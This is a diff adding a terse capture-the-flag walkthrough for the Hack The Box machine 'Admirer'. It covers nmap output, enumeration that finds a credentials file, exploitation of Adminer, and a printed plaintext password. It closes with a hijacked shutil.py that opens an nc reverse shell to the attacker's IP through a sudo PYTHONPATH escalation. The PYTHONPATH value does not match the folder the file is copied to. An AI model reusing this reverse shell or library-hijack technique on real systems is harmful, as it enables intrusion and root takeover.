@@ -1,0 +1,69 @@
+> nmap scan for services.
+
+-----------------------------------------------------------------------------------------------------
+# Nmap done at Thu May 28 15:45:19 2020 -- 1 IP address (1 host up) scanned in 25.66 seconds
+# Nmap 7.80 scan initiated Thu May 28 15:41:44 2020 as: nmap -A -sC -sV -oN admirer.nmap admirer.htb
+Nmap scan report for admirer.htb (10.10.10.187)
+Host is up (0.24s latency).
+Not shown: 997 closed ports
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
+|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
+|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
+80/tcp open  http    Apache httpd 2.4.25 ((Debian))
+| http-robots.txt: 1 disallowed entry 
+|_/admin-dir
+|_http-server-header: Apache/2.4.25 (Debian)
+|_http-title: Admirer
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Thu May 28 15:42:39 2020 -- 1 IP address (1 host up) scanned in 54.84 seconds
+------------------------------------------------------------------------------------------------------
+
+> we got /admin-dir/ enum it with gobuster.
+> we could find those 2 contents.
+ 	+ /contact.txt (Status: 200)
+	+ /credentials.txt (Status: 200)
+
+> from credentials.txt we can start enum ftp service
+> get another files.
+	+ dump.sql
+	+ html.tar.gz
+
+> depends on everything we scrap:
+	+ creds
+	+ place: /utility-scripts/
+
+> explore to http://admirer.htb/utility-scripts/adminer.php
+> using cred found in db_admin.php to access adminer.php
+> find cve for adminer
+
+-----------------------------------------
+create database exploit;
+use exploit;
+create table dmp(content varchar(5000));
+-----------------------------------------
+
+> found creds waldo:&<h5b~yK3F#{PaPB&dA}{H>
+> get user.txt.
+> basic enum we can see waldo have access rights to 
+	+ /opt/scripts/admin_tasks.sh
+	+ /opt/scripts/backup.py
+> rooting.
+
+shutil.py------------------------------------------------------------------
+import os 
+
+def make_archive(a, b, c): 
+	os.system('nc 10.10.15.245 4444 -e "/bin/sh"')
+---------------------------------------------------------------------------
+
+$ mkdir -p /tmp/fakepath
+$ scp shutil.py waldo@admirer.htb:/tmp/fakepath/
+$ sudo PYTHONPATH=/tmp/fakeshutil /opt/scripts/admin_tasks.sh
+	+ chose 6
+> get root.txt
